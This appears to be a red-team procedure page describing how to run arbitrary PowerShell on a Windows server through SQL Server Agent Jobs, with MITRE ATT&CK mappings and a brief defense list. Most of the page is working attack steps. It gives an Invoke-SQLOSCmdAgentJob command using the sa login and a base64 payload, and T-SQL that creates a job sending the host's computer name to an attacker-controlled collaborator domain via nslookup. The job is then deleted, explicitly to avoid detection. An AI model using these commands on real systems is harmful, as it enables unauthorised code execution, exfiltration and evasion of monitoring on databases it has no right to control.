---
type: procedure
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege-Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - '[[techniques/Scheduled-Job-or-Task|T1053.005 - Scheduled Job or Task]]'
sub_techniques:
  - '[[techniques/PowerShell|T1059.001 - PowerShell]]'
tags:
  - '[[tags/Agent-Jobs]]'
  - '[[tags/Execute-commands-through-SQL-Agent-Job-service]]'
  - '[[tags/MSSQL-Server]]'
commands:
  - '[[commands/create-powershell-job-and-execute-nslookup]]'
tools: []
platforms:
  - Windows
  - SQL Server
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# SQL Agent Job PowerShell Execution

## Summary

This procedure demonstrates how to execute arbitrary PowerShell commands on a target Windows system by leveraging SQL Server Agent Jobs. It involves creating a job step that runs PowerShell code, such as performing network reconnaissance with nslookup, allowing adversaries to bypass endpoint detection by masquerading as legitimate database administration tasks.

## Description

SQL Server Agent is a service that schedules and automates tasks on a Microsoft SQL Server instance, including the execution of PowerShell scripts. An attacker with database access and permissions to manage Agent Jobs can create a transient job that executes PowerShell commands on the server hosting the SQL instance. This technique is useful for post-exploitation activities like reconnaissance, lateral movement, or persistence, as the execution occurs under the context of the SQL Server service, potentially evading user-mode monitoring. The procedure covers two approaches: using the Invoke-SQLOSCmdAgentJob PowerShell cmdlet for remote execution and direct T-SQL commands to create and run the job. Success relies on sufficient privileges (e.g., sysadmin role) and assumes the target runs Windows with PowerShell enabled.

## Requirements

1. Valid credentials for a SQL Server login with permissions to create, execute, and delete Agent Jobs (e.g., sysadmin role).
2. Network access to the SQL Server instance (default port 1433/TCP).
3. PowerShell installed and executable on the host running the SQL Server instance (standard on Windows Server).
4. SQL Server Agent service running and configured to allow PowerShell subsystems.

## Defense

- Monitor SQL Server Agent Job creation, modification, and execution logs for anomalous activity, such as jobs with PowerShell steps from untrusted accounts.
- Restrict Agent Job permissions to only trusted database administrators using role-based access control (RBAC).
- Enable PowerShell logging (Module, ScriptBlock, and Transcription) and integrate with SIEM for anomaly detection on command execution.
- Use database activity monitoring (DAM) tools to alert on sp_add_job, sp_add_jobstep, and sp_start_job invocations.

## Objectives

1. Execute arbitrary PowerShell commands on the target host via SQL Server Agent.
2. Perform reconnaissance, such as DNS queries to external collaborators for data exfiltration.
3. Establish persistence or facilitate lateral movement by scheduling recurring jobs.

## Instructions

### Step 1: Execute PowerShell via Invoke-SQLOSCmdAgentJob Cmdlet

**Context**: Use this remote PowerShell approach if you have a client machine with the SQLOS module installed. Encode your PowerShell payload in base64 to execute commands like nslookup for outbound network testing. This method creates and runs a job directly from a PowerShell session connected to the SQL instance.

**Code** ([[codes/invoke-sqloscmdagentjob-execute-powershell]]):

```ps1
Invoke-SQLOSCmdAgentJob -Subsystem PowerShell -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell e <base64encodedscript>" -Verbose
Subsystem Options:
–Subsystem CmdExec
-SubSystem PowerShell
–Subsystem VBScript
–Subsystem Jscript
```

> The Invoke-SQLOSCmdAgentJob cmdlet from the SQLOS module creates and executes an Agent Job with the specified PowerShell command. Replace <DBSERVERNAME\DBInstance> with your target instance (e.g., "SERVER\SQLEXPRESS"), provide valid credentials, and base64-encode your script (e.g., powershell -e [base64 of 'nslookup example.com']). The -Verbose flag outputs job execution details. Expected output includes job ID, start time, and success status if the command runs without errors. Other subsystems like CmdExec can be used for batch commands instead of PowerShell.

### Step 2: Create and Execute Job Directly via T-SQL

**Context**: Connect to the SQL Server instance using a tool like sqlcmd or SSMS and run T-SQL to add a job with a PowerShell step. This example creates a job that extracts the first 10 characters of the computer name and performs an nslookup to an attacker-controlled domain for reconnaissance or exfiltration. The job includes retry logic and is deleted afterward to minimize footprint.

**Command** ([[commands/create-powershell-job-and-execute-nslookup]]):

```sql
USE msdb; 
EXEC dbo.sp_add_job @job_name = N'test_powershell_job1'; 
EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'$name=$env:COMPUTERNAME[10];nslookup "$name.redacted.burpcollaborator.net"', @retry_attempts = 1, @retry_interval = 5 ;
EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; 
EXEC dbo.sp_start_job N'test_powershell_job1';

-- delete
EXEC dbo.sp_delete_job @job_name = N'test_powershell_job1';
```

> This sequence uses stored procedures to create a job in the msdb database, add a PowerShell step with the nslookup command (customize the domain for your collaborator service), target the local server, and start the job. Check job history with SELECT * FROM msdb.dbo.sysjobhistory for execution results. Expected output from nslookup appears in the job step log, confirming command execution (e.g., DNS query response). Delete the job immediately to avoid detection. If the job fails, retry attempts ensure reliability.
